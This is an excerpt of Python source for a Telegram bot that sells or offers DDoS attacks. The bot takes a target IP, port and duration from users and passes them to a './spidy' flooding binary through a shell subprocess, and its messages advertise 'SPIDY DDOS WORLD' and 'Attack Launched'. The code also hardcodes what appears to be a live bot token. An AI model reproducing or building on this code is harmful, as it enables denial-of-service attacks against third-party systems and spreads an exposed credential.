...
TOKEN '7250259407:AAHWR2NlM34KZhhG6mm8BGybXWKnyfnbMXk'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./spidy {target_ip} {target_port} {duration} 800")
...
def handle_attack_command(message):
    ...
    try:
        ...
        bot.send_message(chat_id, "*💣 Ready To Launch An Attack?*\n"  # Ready to launch message
                                   ...
                                   "*OWNER @ASHRAFGMING🧛*", parse_mode='Markdown')  # Start chaos message
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, f"*🚀 Attack Launched! 🚀*\n\n"  # Attack launched message
                                           ...
                                           f"*⏰ TIME<>{duration} seconds send feedback to @ASHRAFGMING🔥*", parse_mode='Markdown')  # Duration message
...
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO SPIDY DDOS WORLD!* 🎉\n\n"
...
if __name__ == "__main__":
    ...
    logging.info("Bot started join @ASHRAFGMING...")
    while True:
        try:
